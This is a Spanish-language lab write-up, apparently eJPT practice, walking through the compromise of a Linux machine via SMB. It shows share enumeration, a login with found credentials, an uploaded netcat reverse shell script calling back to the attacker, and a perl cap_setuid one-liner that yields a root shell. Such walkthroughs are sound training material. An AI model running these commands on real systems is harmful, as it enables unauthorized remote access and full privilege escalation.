
---

## Writeup: Explotación de Máquina Linux

### 1. **Reconocimiento Inicial**

Se realiza un reconocimiento sobre la máquina para obtener información básica, identificar servicios y posibles vectores de ataque. Durante este proceso, descubrimos que el puerto **445** (SMB) está abierto en la máquina de destino, lo que indica que puede estar ejecutando un servidor **Samba**.

### 2. **Enumeración de SMB**

Se utiliza el comando `netexec smb` para obtener información sobre los servicios SMB de la máquina remota:

```bash
netexec smb 1.2.3.4
```

El servicio SMB revela que la máquina está ejecutando **Samba** en un entorno **Linux**, específicamente una versión de Samba 4.17.12-Debian.

A continuación, se realiza una enumeración de los recursos compartidos SMB mediante el siguiente comando:

```bash
smbclient -NL //1.2.3.4
```

La salida muestra los recursos compartidos disponibles, como:

- **print$**: Drivers de impresora.
- **tmp**: Directorio temporal.
- **IPC$**: Servicio IPC de Samba.

### 3. **Exploración del Recurso Compartido**

Se accede al recurso **`tmp`** con las credenciales obtenidas y se explora su contenido:

```bash
smbclient -U "xerosec%david1" //1.2.3.4/tmp
```

Tras acceder al recurso, se sube un **script de reverse shell** (`config.sh`) para obtener acceso remoto como usuario **`xerosec`**.

### 4. **Explotación de Reverse Shell**

El script `config.sh` contiene un comando que abre una conexión de reverse shell en el puerto **443** de la máquina atacante:

```bash
#!/bin/bash 
busybox nc 1.2.3.4 443 -e /bin/bash
```

El script se sube a la máquina víctima y se ejecuta, lo que establece una conexión de reverse shell hacia la máquina atacante.

En el lado de la máquina atacante, se configura un listener con `nc`:

```bash
nc -lvnp 443
```

Una vez ejecutado el script, se establece la conexión y se obtiene acceso como usuario **`xerosec`**.

### 5. **Escalada de Privilegios**

Al realizar la exploración, se detectan permisos de **capabilities** sobre el binario **`perl`**:

```bash
getcap -r /
/usr/bin/perl5.36.0 cap_setuid=ep
/usr/bin/ping cap_net_raw=ep
/usr/bin/perl cap_setuid=ep
```

El binario **`perl`** tiene el permiso **`cap_setuid=ep`**, lo que permite cambiar el UID a **0 (root)** sin necesidad de privilegios adicionales.

Se utiliza el siguiente **one-liner** para aprovechar el permiso de **setuid** y obtener acceso como **root**:

```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```

Tras ejecutar este comando, se obtiene una shell con privilegios de **root**.

### 6. **Acceso como Root**

Con la shell como **root**, se confirma el cambio de privilegios mediante el siguiente comando:

```bash
id
```

La salida muestra que ahora somos el usuario **root**:

```bash
root@magic:~# id
uid=0(root) gid=1000(xerosec) grupos=1000(xerosec)
```

### 7. **Lectura de las Flags**

Con acceso como **root**, se procede a leer las flags **`user.txt`** y **`root.txt`**, completando exitosamente el ejercicio.

---

### 8. **Conclusión**

- **Reconocimiento y explotación de servicios SMB**.
- **Escalada de privilegios exitosa** utilizando el binario **`perl`** y los permisos de **capabilities**.
- **Acceso como root** y lectura de las **flags** para completar el ejercicio.

Este writeup cubre un ataque desde la **enumeración inicial** hasta la **explotación final**, y es un excelente ejemplo de técnicas que podrían presentarse en el examen **eJPT**.

---
